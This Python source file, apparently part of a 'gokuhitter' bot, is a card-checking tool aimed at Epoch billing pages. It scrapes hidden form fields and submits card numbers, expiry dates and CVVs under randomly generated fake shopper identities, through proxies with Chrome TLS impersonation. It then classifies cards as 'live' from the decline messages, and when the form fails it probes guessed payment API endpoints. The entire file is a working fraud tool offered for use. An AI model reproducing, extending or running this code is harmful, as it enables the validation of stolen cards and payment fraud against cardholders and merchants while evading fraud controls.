"""
Epoch Payment Engine (gokuhitter_bot)
─────────────────────────────────────
Full Epoch billing page scraper, hidden form parameter extraction,
payment submission, and authorization parsing with TLS browser impersonation.
"""

import re
import json
import time
import random
import urllib.parse
from typing import Dict, Optional, Tuple
from urllib.parse import urljoin, urlparse, parse_qs
from curl_compat import ChromeSession

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

def _generate_random_shopper(country_code: str = 'US') -> dict:
    FIRST_NAMES = ['James', 'Michael', 'Robert', 'John', 'David', 'William', 'Richard', 'Joseph', 'Thomas', 'Charles', 'Christopher', 'Daniel', 'Matthew', 'Anthony', 'Mark', 'Steven', 'Paul', 'Andrew', 'Joshua', 'Sarah', 'Emily', 'Emma', 'Olivia', 'Sophia', 'Isabella', 'Ava', 'Mia', 'Charlotte', 'Amelia']
    LAST_NAMES = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez', 'Hernandez', 'Lopez', 'Gonzalez', 'Wilson', 'Anderson', 'Thomas', 'Taylor', 'Moore', 'Jackson', 'Martin']
    DOMAINS = ['gmail.com', 'outlook.com', 'yahoo.com', 'icloud.com', 'hotmail.com', 'proton.me']
    
    first = random.choice(FIRST_NAMES)
    last = random.choice(LAST_NAMES)
    num = random.randint(100, 9999)
    email = f"{first.lower()}.{last.lower()}{num}@{random.choice(DOMAINS)}"
    phone = f"{random.randint(201, 989)}{random.randint(100, 999)}{random.randint(1000, 9999)}"
    
    STREETS = ['Oak Street', 'Maple Ave', 'Washington Blvd', 'Lincoln Way', 'Cedar Lane', 'Pine Street', 'Park Ave', 'Broadway', 'Elm St', 'Main St']
    CITIES_ZIP = [
        ('New York', 'NY', '10001'), ('Los Angeles', 'CA', '90001'), ('Chicago', 'IL', '60601'),
        ('Houston', 'TX', '77001'), ('Miami', 'FL', '33101'), ('Dallas', 'TX', '75201'),
        ('Seattle', 'WA', '98101'), ('Boston', 'MA', '02108'), ('Atlanta', 'GA', '30301'),
    ]
    city, state, zip_code = random.choice(CITIES_ZIP)
    house_num = str(random.randint(10, 9999))
    street = f"{house_num} {random.choice(STREETS)}"
    
    return {
        'first_name': first,
        'last_name': last,
        'full_name': f"{first} {last}",
        'email': email,
        'phone': phone,
        'street': street,
        'house_number': house_num,
        'city': city,
        'state': state,
        'postal_code': zip_code,
        'country': country_code or 'US'
    }

class EpochHitter:
    """Universal Epoch Billing & Payment Gateway Engine."""

    DECLINE_MAP = {
        "declined": "card_declined",
        "insufficient funds": "insufficient_funds",
        "expired card": "expired_card",
        "invalid card": "invalid_number",
        "cvv declined": "incorrect_cvc",
        "cvc declined": "incorrect_cvc",
        "suspected fraud": "fraud",
        "restricted card": "restricted_card",
        "issuer unavailable": "issuer_unavailable",
    }

    def __init__(self, url: str, proxy_data: Optional[dict] = None):
        self.url = url.strip()
        if not self.url.startswith(("http://", "https://")):
            self.url = f"https://{self.url}"
        self.proxy_data = proxy_data
        self._base_cfg: Optional[dict] = None

    def _get_origin(self) -> str:
        parsed = urlparse(self.url)
        if parsed.netloc:
            return f"{parsed.scheme or 'https'}://{parsed.netloc}"
        return "https://billing.epoch.com"

    async def _scrape(self, session) -> dict:
        """Scrapes Epoch checkout page for form target action & hidden parameter fields."""
        hdr = {
            "User-Agent": UA,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
        }
        cfg = {
            'action': self.url,
            'merchant': 'Epoch Merchant',
            'amount': None,
            'currency': 'USD',
            'form_data': {},
            'is_epoch': False,
        }

        if any(domain in self.url.lower() for domain in ['epoch.com', 'epochbilling', 'billing.epoch']):
            cfg['is_epoch'] = True

        async with session.get(self.url, headers=hdr, timeout=12) as res:
            html = res.text() if callable(res.text) else res.text
            
            # Check title
            t = re.search(r'<title>([^<]+)</title>', html, re.I)
            if t:
                title = t.group(1).strip()
                if 'epoch' in title.lower() or 'billing' in title.lower():
                    cfg['is_epoch'] = True
                    cfg['merchant'] = title[:30]

            # Extract form action
            m_form = re.search(r'<form[^>]+action=["\']([^"\']+)["\'][^>]*>', html, re.I)
            if m_form:
                action_target = m_form.group(1)
                cfg['action'] = urljoin(self.url, action_target)

            # Extract hidden input fields
            inputs = re.findall(r'<input[^>]+type=["\']?hidden["\']?[^>]*>', html, re.I)
            for inp in inputs:
                name_m = re.search(r'name=["\']([^"\']+)["\']', inp, re.I)
                val_m = re.search(r'value=["\']([^"\']*)["\']', inp, re.I)
                if name_m and val_m:
                    cfg['form_data'][name_m.group(1)] = val_m.group(1)

            # Detect Epoch / WNU parameters in page or URL
            for param in ['pi_code', 'reseller', 'co_code', 'member_idx', 'pi_idx', 'order_id', 'cachekey', 'sessionid', 'wnu.com', 'invoice']:
                if param in html.lower() or param in self.url.lower():
                    cfg['is_epoch'] = True

            if m_form:
                cfg['is_epoch'] = True

            # Extract amount / price if visible
            amt_m = re.search(r'(?:USD|EUR|GBP|\$|£|€)\s*([\d\.]+)', html)
            if amt_m:
                cfg['amount'] = amt_m.group(1)

        return cfg

    async def _get_config(self, session) -> dict:
        if self._base_cfg is None:
            self._base_cfg = await self._scrape(session)
            return self._base_cfg.copy()
        return self._base_cfg.copy()

    def _parse_response(self, html: str, status_code: int, result: dict) -> dict:
        """Parses Epoch response page/JSON for approval or decline details."""
        # Try JSON parsing first
        try:
            d = json.loads(html)
            if isinstance(d, dict):
                result['raw_response'] = d
                msg = d.get('message') or d.get('error') or d.get('status') or ''
                if d.get('status') is True or d.get('isApproved') is True or d.get('status') == 'Succeeded':
                    result['success'] = True
                    result['receipt_url'] = d.get('url') or d.get('receipt_url')
                    return result
                result['decline_code'] = 'card_declined'
                result['error'] = msg or 'Your payment was declined; please try again.'
                return result
        except Exception:
            pass

        html_low = html.lower()

        # Approval indicators
        if any(term in html_low for term in ['approved', 'thank you for your order', 'transaction successful', 'order confirmation', 'welcome to', 'payment successful', 'order id:']):
            result['success'] = True
            m_url = re.search(r'href=["\'](https?://[^"\']+)["\']', html)
            if m_url:
                result['receipt_url'] = m_url.group(1)
            return result

        # 3DS / Redirect indicators
        if any(term in html_low for term in ['3d secure', '3ds', 'payer authentication', 'cardholder authentication', 'redirecting']):
            result['decline_code'] = '3ds_required'
            result['error'] = '3DS Authentication Required'
            result['is_live'] = True
            m_url = re.search(r'(https?://[^\s"\'<>]+(?:3d|acs|auth)[^\s"\'<>]*)', html, re.I)
            if m_url:
                result['redirect_url'] = m_url.group(1)
            return result

        # Explicit decline text extraction
        decline_m = re.search(r'(?:decline|refused|error|reason|message)\s*[:=]\s*["\']?([^"\'<.\n]{5,100})', html, re.I)
        if decline_m:
            reason = decline_m.group(1).strip()
            reason_low = reason.lower()
            mapped = 'card_declined'
            for k, v in self.DECLINE_MAP.items():
                if k in reason_low:
                    mapped = v
                    break
            result['decline_code'] = mapped
            result['error'] = reason
            result['is_live'] = mapped in ['insufficient_funds', 'incorrect_cvc', '3ds_required', 'restricted_card', 'issuer_unavailable']
            return result

        if 'insufficient funds' in html_low:
            result['decline_code'] = 'insufficient_funds'
            result['error'] = 'Insufficient Funds'
            result['is_live'] = True
            return result

        if 'cvv' in html_low or 'cvc' in html_low:
            result['decline_code'] = 'incorrect_cvc'
            result['error'] = 'CVV / CVC Declined'
            result['is_live'] = True
            return result

        result['decline_code'] = 'card_declined'
        result['error'] = 'Your payment was declined; please try again.'
        return result

    async def hit(self, card: dict, attempt: int, user_id: int) -> dict:
        """Executes payment attempt against Epoch gateway."""
        t0 = time.time()
        result = dict(
            attempt=attempt, card=card, success=False,
            decline_code=None, response_time=0,
            merchant='Epoch Merchant', proxy_raw=None,
            error=None, raw_response=None, is_live=False, psp=None,
        )

        proxies = None
        if self.proxy_data:
            result['proxy_raw'] = self.proxy_data.get('raw')
            auth = (f"{self.proxy_data['username']}:{self.proxy_data['password']}@"
                    if 'username' in self.proxy_data else "")
            purl = f"http://{auth}{self.proxy_data['server'].replace('http://', '')}"
            proxies = {"http": purl, "https": purl}

        try:
            async with ChromeSession(impersonate="chrome131", proxies=proxies, timeout=12) as sess:
                cfg = await self._get_config(sess)
                result['merchant'] = cfg.get('merchant', 'Epoch Merchant')
                if cfg.get('amount'):
                    result['amount'] = f"USD {cfg['amount']}"

                if not cfg.get('is_epoch') and 'epoch' not in self.url.lower():
                    result['error'] = "No Epoch checkout gateway detected on this page"
                    result['decline_code'] = 'no_epoch'
                    result['response_time'] = round(time.time() - t0, 2)
                    return result

                shopper = _generate_random_shopper()
                yr = card['year'] if len(card['year']) == 4 else f"20{card['year']}"
                yr_short = yr[-2:]

                payload = {
                    **cfg['form_data'],
                    'card_number': card['card'],
                    'card_num': card['card'],
                    'card_number_1': card['card'],
                    'expire_month': card['month'].zfill(2),
                    'expire_year': yr_short,
                    'expire_year_full': yr,
                    'cvv2': card['cvv'],
                    'cvv': card['cvv'],
                    'security_code': card['cvv'],
                    'name_on_card': shopper['full_name'],
                    'first_name': shopper['first_name'],
                    'last_name': shopper['last_name'],
                    'email': shopper['email'],
                    'street': shopper['street'],
                    'city': shopper['city'],
                    'state': shopper['state'],
                    'zip': shopper['postal_code'],
                    'country': shopper['country'],
                }

                target_action = cfg['action'] or self.url
                hdr = {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,application/json,*/*;q=0.8",
                    "User-Agent": UA,
                    "Origin": self._get_origin(),
                    "Referer": self.url,
                }

                async with sess.post(target_action, data=urllib.parse.urlencode(payload), headers=hdr, timeout=15) as r:
                    html_resp = r.text() if callable(r.text) else r.text
                    
                    # If form submission returns 401 missing auth header, probe direct JSON API endpoints
                    if r.status_code == 401 or 'authorization' in html_resp.lower():
                        api_body = {
                            "cardNumber": card['card'],
                            "card": card['card'],
                            "expirationMonth": card['month'].zfill(2),
                            "expirationYear": yr_short,
                            "cardCvc": card['cvv'],
                            "cvv": card['cvv'],
                            "billingAddress": {
                                "firstName": shopper['first_name'],
                                "lastName": shopper['last_name'],
                                "email": shopper['email'],
                                "address": shopper['street'],
                                "city": shopper['city'],
                                "state": shopper['state'],
                                "zip": shopper['postal_code'],
                                "country": shopper['country']
                            }
                        }
                        json_hdr = {
                            "Content-Type": "application/json",
                            "Accept": "application/json",
                            "User-Agent": UA,
                            "Origin": self._get_origin(),
                            "Referer": self.url,
                        }
                        api_endpoints = ['/api/v1/checkout/pay', '/api/pay', '/api/payment/submit', '/invoice/pay', '/api/checkout']
                        for ep in api_endpoints:
                            target_api = urljoin(self.url, ep)
                            try:
                                async with sess.post(target_api, json=api_body, headers=json_hdr, timeout=8) as r_api:
                                    if r_api.status_code in (200, 201, 400, 422):
                                        api_resp = r_api.text() if callable(r_api.text) else r_api.text
                                        result['response_time'] = round(time.time() - t0, 2)
                                        return self._parse_response(api_resp, r_api.status_code, result)
                            except Exception:
                                continue

                    result['response_time'] = round(time.time() - t0, 2)
                    return self._parse_response(html_resp, r.status_code, result)

        except Exception as ex:
            result['response_time'] = round(time.time() - t0, 2)
            result['decline_code'] = 'exception'
            result['error'] = str(ex)[:150]
            return result
